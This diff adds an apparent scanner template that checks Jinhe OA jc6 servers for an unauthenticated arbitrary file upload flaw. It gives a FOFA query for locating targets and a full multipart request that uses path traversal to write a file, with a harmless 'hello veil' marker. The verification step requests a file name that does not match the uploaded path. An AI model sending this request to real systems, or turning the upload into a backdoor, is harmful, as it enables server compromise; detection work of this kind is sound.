@@ -1,0 +1,50 @@
+## id: VEID-2024-0108
+## name: 金和OA_jc6_ntko-upload任意文件上传漏洞
+## author: hack007x
+## severity: critical
+## tags: veid,file,veid2024
+## description:金和OA jc6系统ntkoUpload接口处存在任意文件上传漏洞，未经身份认证的攻击者可利用此漏洞上传恶意后门文件，最终可导致服务器失陷。
+## fofa-query: app="金和网络-金和OA"
+## verification: true
+
+
+
+POST /jc6/ntkoUpload/ntko-upload!upload.action HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: multipart/form-data; boundary=----zqulxi4ku42pfmoelvc0
+
+------zqulxi4ku42pfmoelvc0
+Content-Disposition: form-data; name="filename"
+
+../../../../upload/xicxc2sv1n.jsp
+------zqulxi4ku42pfmoelvc0
+Content-Disposition: form-data; name="upLoadFile"; filename="a.txt"
+Content-Type: image/jpeg
+
+hello veil
+------zqulxi4ku42pfmoelvc0
+Content-Disposition: form-data; name="Submit"
+
+upload
+------zqulxi4ku42pfmoelvc0--
+
+#@ condition: and
+#@ matcher: status_code == 200
+
+
+---
+
+GET /upload/a.txt HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: body contains "hello veil"
+
+
+
+
+
+# @VEIL-STAMP: 11aad7103c70485c9e38fb18c807d027b390a915ad6b64656b6047d1cf5067f9
